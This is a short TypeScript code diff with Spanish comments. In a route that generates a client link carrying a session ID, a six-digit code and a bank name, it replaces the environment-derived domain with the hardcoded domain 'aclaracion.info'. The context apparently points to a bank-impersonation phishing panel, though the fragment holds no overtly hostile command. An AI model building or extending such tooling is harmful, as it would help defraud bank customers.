@@ -591,15 +591,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
         pasoActual: ScreenType.FOLIO,
       });
 
-      // Obtenemos el dominio base desde las variables de entorno
-      const { REPLIT_DOMAINS } = process.env;
-      const domain = REPLIT_DOMAINS ? REPLIT_DOMAINS.split(',')[0] : 'localhost:5000';
+      // Utilizamos el dominio aclaracion.info en lugar de los dominios de Replit
+      const domain = 'aclaracion.info';
 
-      // En lugar de intentar usar subdominios, usaremos rutas diferentes
-      // La ruta del cliente tendrá un prefijo especial que la hace diferente 
-      // del panel de administración
-
-      // Armamos el enlace final - usando la misma URL base pero con una ruta específica
+      // Armamos el enlace final usando el dominio especificado
       const link = `https://${domain}/client/${sessionId}`;
 
       console.log(`Nuevo enlace generado - Código: ${sixDigitCode}, Banco: ${banco}`);
